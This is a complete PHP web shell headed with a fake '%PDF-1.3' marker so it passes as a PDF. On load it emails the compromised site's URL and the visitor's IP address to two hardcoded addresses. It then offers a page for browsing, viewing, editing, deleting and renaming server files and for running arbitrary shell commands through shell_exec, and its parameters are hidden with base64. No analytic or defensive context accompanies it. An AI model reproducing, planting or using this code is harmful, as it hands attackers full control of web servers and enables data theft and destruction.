%PDF-1.3
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'magelang1337@gmail.com, cowokerensteam@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<!DOCTYPE html>
<html>
<head>
    <title>@bukanseo</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .result-box {
            width: 97.5%;
            height: 200px;
            resize: none;
            overflow: auto;
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
        hr {
            border: 0;
            border-top: 1px solid #ddd;
            margin: 20px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f2f2f2;
        }
        input[type="text"], input[type="submit"], textarea {
            width: calc(100% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Roboto', sans-serif;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
<div class="container">
    <?php
    echo '<hr>';
    $a = realpath($_SERVER['DOCUMENT_ROOT']);

    function x($b)
    {
        return base64_encode($b);
    }

    function y($b)
    {
        return base64_decode($b);
    }

    foreach ($_GET as $c => $d) $_GET[$c] = y($d);

    $e = realpath(isset($_GET['d']) ? $_GET['d'] : $a);
    chdir($e);

    $viewCommandResult = '<hr>Result:<br>' .
        '<textarea class="result-box">' ;

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $e . '/' . $_POST['folder_name'];
            mkdir($newFolder);
            echo '<hr>Folder created successfully!';
        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $newFile = $e . '/' . $_POST['file_name'];
            file_put_contents($newFile, '');
            echo '<hr>File created successfully!';
        } elseif (isset($_POST['edit_file'], $_POST['file_content'])) {
            $fileToEdit = $e . '/' . $_POST['edit_file'];
            file_put_contents($fileToEdit, $_POST['file_content']);
            echo '<hr>File edited successfully!';
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $e . '/' . $_POST['delete_file'];
            if (is_file($fileToDelete)) {
                unlink($fileToDelete);
                echo '<hr>File deleted successfully!';
            } elseif (is_dir($fileToDelete)) {
                deleteDirectory($fileToDelete);
                echo '<hr>Folder deleted successfully!';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $e . '/' . $_POST['old_name'];
            $newName = $e . '/' . $_POST['new_name'];
            if (is_file($oldName)) {
                rename($oldName, $newName);
                echo '<hr>File renamed successfully!';
            } elseif (is_dir($oldName)) {
                rename($oldName, $newName);
                echo '<hr>Folder renamed successfully!';
            }
        } elseif (isset($_POST['cmd_input'])) {
            $command = $_POST['cmd_input'];
            $output = shell_exec($command);
            $viewCommandResult .= htmlspecialchars($output);
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $e . '/' . $_POST['view_file'];
            if (is_file($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult .= $fileContent;
            } else {
                $viewCommandResult .= 'Error: File not found!';
            }
        }
    }

    $viewCommandResult .= '</textarea>';

    echo '<hr>curdir: ';
    $directories = explode(DIRECTORY_SEPARATOR, $e);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        if ($index == 0) {
            echo '<a href="?d=' . x($dir) . '">' . $dir . '</a>';
        } else {
            $currentPath .= DIRECTORY_SEPARATOR . $dir;
            echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
        }
    }
    echo '<br>';

    echo '<form method="post" action="?'.$_SERVER['QUERY_STRING'].'"><input type="text" name="folder_name" placeholder="New Folder Name"><input type="submit" value="Create Folder"></form>';
    echo '<form method="post" action="?'.$_SERVER['QUERY_STRING'].'"><input type="text" name="edit_file" placeholder="Create / Edit File"><textarea name="file_content" placeholder="File Content"></textarea><input type="submit" value="Edit File"></form>';
    echo '<form method="post" action="?'.$_SERVER['QUERY_STRING'].'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
    echo $viewCommandResult; // Display command result
    echo '<div>';
    echo '</div>';
    echo '<table border=1>';
    echo '<br><tr><th>Item Name</th><th>Size</th><th>View</th><th>Delete</th><th>Rename</th></tr>';
    foreach (scandir($e) as $v) {
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?d=' . x($e . '/' . $v) : '?'.('d='.x($e).'&f='.x($v));
        echo '<tr><td><a href="'.$itemLink.'">'.$v.'</a></td><td>'.$s['size'].'</td><td><form method="post" action="?'.$_SERVER['QUERY_STRING'].'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value="View"></form></td><td><form method="post" action="?'.$_SERVER['QUERY_STRING'].'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete"></form></td><td><form method="post" action="?'.$_SERVER['QUERY_STRING'].'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td></tr>';
    }
    echo '</table>';

    // Fungsi untuk menghapus folder beserta isinya secara rekursif
    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</div>
</body>
</html>
